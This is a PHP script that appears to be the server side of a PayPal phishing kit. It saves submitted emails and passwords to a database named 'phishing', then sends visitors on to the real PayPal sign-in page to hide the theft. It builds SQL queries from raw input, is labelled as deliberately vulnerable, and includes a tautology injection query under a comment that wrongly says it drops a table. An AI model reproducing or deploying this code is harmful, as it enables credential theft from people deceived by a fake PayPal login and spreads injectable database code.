<?php
// Database connection information
$servername = "127.0.0.1";
$username = "root";
$password = "Phantom123@";
$dbname = "phishing";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve user input
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Check if email and password are provided
    if (empty($email) || empty($password)) {
        die("Email and password are required.");
    }

    // SQL injection vulnerability: directly incorporating user input
    $query = "SELECT password FROM credentials WHERE email = '$email'";
    $result = $conn->query($query);

    // Check if user exists
    if ($result && $result->num_rows > 0) {
        // Fetch user data
        $row = $result->fetch_assoc();
        $hashed_password = $row['password'];

        // Verify the password
        if (password_verify($password, $hashed_password)) {
            echo "Login successful!";
        } else {
            echo "Login failed.";
        }
    } else {
        // If user doesn't exist, insert new credentials
        $obfuscated_password = password_hash($password, PASSWORD_DEFAULT);
        $insert_query = "INSERT INTO credentials (email, password) VALUES ('$email', '$obfuscated_password')";
        $conn->query($insert_query);

        echo "New credentials stored.";
    }

    //  dropping a table
    $malicious_query = "SELECT * FROM credentials WHERE email = '$email' OR '1'='1'; --";
    $malicious_result = $conn->query($malicious_query);
    
}

// Close the database connection
$conn->close();
?>

<script>
    // Redirect to the real PayPal site
    window.onload = function() {
        window.location.replace("https://www.paypal.com/signin");
    };
</script>


